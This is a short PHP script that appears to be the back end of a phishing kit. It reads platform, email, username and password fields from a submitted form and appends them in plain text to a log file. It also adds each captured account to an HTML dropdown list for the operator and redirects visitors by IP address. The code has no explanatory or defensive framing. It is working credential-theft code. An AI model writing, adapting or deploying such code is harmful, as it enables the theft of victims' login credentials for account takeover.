<?php
$ip = $_SERVER['REMOTE_ADDR'];
$lines = file('./login.encrypt');
$before = $lines[0];

if ($ip == $before){$pathnext = "./index.php?pesan=2";}
else {   $pathnext = "./login.php";
}header("Location: $pathnext");?>
<?php include './path.php'?>
<?php


$platfrom = $_POST['platfrom'];
$email = $_POST['email'];
$username = $_POST['username'];
$password = $_POST['password'];


$waktu = time();
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
    

}
$random = generateRandomString();


$encrypt = "<encrypt>".$waktu.$random."</encrypt>";
$encrypthandle2 = "$waktu$random";

$handle = fopen("$pathnya","a");

fwrite($handle,"
$email|$username|$password|$platfrom|$encrypt
");

$handle2 = fopen("$pathconfig","a");
fwrite($handle2,"
<option value='$encrypthandle2'> $platfrom - @$username ($email) </option>
");

?>